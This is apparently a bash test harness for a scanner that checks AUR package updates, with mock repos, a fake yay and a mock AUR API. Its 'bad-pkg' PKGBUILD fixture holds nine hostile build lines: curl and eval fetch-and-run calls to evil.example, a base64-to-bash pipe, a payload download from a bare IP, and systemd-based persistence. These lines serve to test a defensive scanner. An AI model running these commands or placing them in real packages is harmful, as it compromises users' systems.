#!/usr/bin/env bash
# Test harness for safe-update.test
# Sets up local mock AUR repos + fake yay + mock AUR API, then launches the script.
#
# Usage:
#   ./test/run-harness.sh [good|bad|both]   (default: both)
#
# "good" puts good-pkg in the update queue (scanner should pass cleanly).
# "bad"  puts bad-pkg  in the update queue (all 9 scanner patterns should fire).
# "both" queues both packages.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(dirname "$SCRIPT_DIR")"
TEST_SCRIPT="$REPO_ROOT/safe-update.test"

SCENARIO="${1:-both}"

# ── temp workspace ────────────────────────────────────────────────────────────
WORK=$(mktemp -d /tmp/safe-update-harness-XXXXXX)
trap 'rm -rf "$WORK"' EXIT

FAKE_BIN="$WORK/bin"
REPOS="$WORK/repos"
mkdir -p "$FAKE_BIN" "$REPOS"

# ── mock repos ────────────────────────────────────────────────────────────────
_make_bare_repo() {
  local name="$1"
  local pkgbuild_content="$2"
  local bare="$REPOS/${name}.git"

  git init --quiet --bare "$bare"

  # Build the initial commit in a temp working tree
  local wtree="$WORK/wt-$name"
  git clone --quiet "$bare" "$wtree"
  printf '%s\n' "$pkgbuild_content" > "$wtree/PKGBUILD"
  git -C "$wtree" add PKGBUILD
  git -C "$wtree" -c user.email="test@test" -c user.name="Test" \
    commit --quiet -m "initial"
  git -C "$wtree" push --quiet origin HEAD
}

# A second commit so there is an actual diff for show_pkgbuild_diff to display.
_push_update_commit() {
  local name="$1"
  local new_pkgver="$2"
  local bare="$REPOS/${name}.git"
  local wtree="$WORK/wt-$name"

  sed -i "s/^pkgver=.*/pkgver=$new_pkgver/" "$wtree/PKGBUILD"
  git -C "$wtree" add PKGBUILD
  git -C "$wtree" -c user.email="test@test" -c user.name="Test" \
    commit --quiet -m "bump to $new_pkgver"
  git -C "$wtree" push --quiet origin HEAD
}

# ── good PKGBUILD ─────────────────────────────────────────────────────────────
GOOD_PKGBUILD='# Maintainer: Alice <alice@example.com>
pkgname=good-pkg
pkgver=1.0.0
pkgrel=1
pkgdesc="A harmless test package"
arch=(x86_64)
url="https://example.com/good-pkg"
license=(MIT)
source=()
sha256sums=()

package() {
  install -Dm644 /dev/null "$pkgdir/usr/share/good-pkg/dummy"
}'

# ── bad PKGBUILD ──────────────────────────────────────────────────────────────
# One line per scanner pattern (all 9).
BAD_PKGBUILD='# Maintainer: mallory <m@evil.example>
pkgname=bad-pkg
pkgver=1.0.0
pkgrel=1
pkgdesc="Definitely not malware"
arch=(x86_64)
url="https://evil.example"
license=(custom)
source=()
sha256sums=()

build() {
  # pattern 1 — package manager install (Atomic Arch vector)
  npm install -g exfil-tool

  # pattern 2 — pipe to shell
  curl https://evil.example/setup.sh | bash

  # pattern 3 — eval with command substitution
  eval $(curl -s https://evil.example/cmd)

  # pattern 4 — base64 decode
  echo "aGVsbG8=" | base64 --decode | bash

  # pattern 5 — curl to bare IP address
  curl http://192.168.1.200/payload -o /tmp/p

  # pattern 6 — write to home dir
  cp backdoor $HOME/.local/share/systemd/user/legit.service

  # pattern 7 — systemd user-unit path (persistence)
  install -Dm644 legit.service "$HOME/.config/systemd/user/legit.service"

  # pattern 8 — systemctl enable
  systemctl enable --user legit.service

  # pattern 9 — background process
  nohup /tmp/p &
}

package() {
  true
}'

# ── build mock repos ──────────────────────────────────────────────────────────
_make_bare_repo "good-pkg" "$GOOD_PKGBUILD"
_push_update_commit "good-pkg" "1.1.0"

_make_bare_repo "bad-pkg" "$BAD_PKGBUILD"
_push_update_commit "bad-pkg" "1.1.0"

# ── fake yay ──────────────────────────────────────────────────────────────────
# Emits lines in `yay -Qu` format: "pkgname oldver -> newver"
# Only packages that map to AUR (no hit in `expac -S`) matter;
# safe-update.test will call the real AUR API mock for metadata.
case "$SCENARIO" in
  good) QUEUE=("good-pkg") ;;
  bad)  QUEUE=("bad-pkg")  ;;
  both) QUEUE=("good-pkg" "bad-pkg") ;;
  *) echo "Unknown scenario: $SCENARIO (use good|bad|both)"; exit 1 ;;
esac

YAY_OUTPUT=""
for pkg in "${QUEUE[@]}"; do
  YAY_OUTPUT+="$pkg 1.0.0-1 -> 1.1.0-1"$'\n'
done

cat > "$FAKE_BIN/yay" <<EOF
#!/usr/bin/env bash
# Intercept -Qu; pass everything else to the real yay.
if [[ "\$*" == *"-Qu"* ]]; then
  printf '%s' $(printf '%q' "$YAY_OUTPUT")
else
  exec /usr/bin/yay "\$@"
fi
EOF
chmod +x "$FAKE_BIN/yay"

# ── mock AUR API server ───────────────────────────────────────────────────────
# Returns plausible JSON: age > 72 h so packages pass the age gate,
# no OutOfDate flag, fake maintainer name.
NOW_EPOCH=$(date +%s)
LAST_MOD=$((NOW_EPOCH - 360000))   # ~100 hours old — clears the 72-hour gate

MOCK_SERVER_PY="$WORK/mock_aur_api.py"
cat > "$MOCK_SERVER_PY" <<PYEOF
import http.server, json, urllib.parse, sys

PACKAGES = {
  "good-pkg": {"Name": "good-pkg", "LastModified": $LAST_MOD, "OutOfDate": None, "Maintainer": "alice"},
  "bad-pkg":  {"Name": "bad-pkg",  "LastModified": $LAST_MOD, "OutOfDate": None, "Maintainer": "mallory"},
}

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass  # silence request log
    def do_GET(self):
        qs = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(qs)
        names = params.get("arg[]", [])
        results = [PACKAGES[n] for n in names if n in PACKAGES]
        body = json.dumps({"version": 5, "type": "multiinfo",
                           "resultcount": len(results), "results": results}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

port = int(sys.argv[1])
http.server.HTTPServer(("127.0.0.1", port), Handler).serve_forever()
PYEOF

# Pick a free port
API_PORT=$(python3 -c "import socket; s=socket.socket(); s.bind(('',0)); print(s.getsockname()[1]); s.close()")
python3 "$MOCK_SERVER_PY" "$API_PORT" &
API_PID=$!
trap 'kill $API_PID 2>/dev/null; rm -rf "$WORK"' EXIT

# Brief wait for server to come up
sleep 0.3

# ── launch safe-update.test ───────────────────────────────────────────────────
echo "════════════════════════════════════════════════════════════"
echo " safe-update test harness"
echo " scenario : $SCENARIO"
echo " repos    : file://$REPOS"
echo " AUR API  : http://127.0.0.1:$API_PORT"
echo "════════════════════════════════════════════════════════════"
echo

export SAFE_UPDATE_AUR_BASE="file://$REPOS"
export SAFE_UPDATE_AUR_API="http://127.0.0.1:${API_PORT}/rpc/v5/info"
export PATH="$FAKE_BIN:$PATH"

exec "$TEST_SCRIPT"
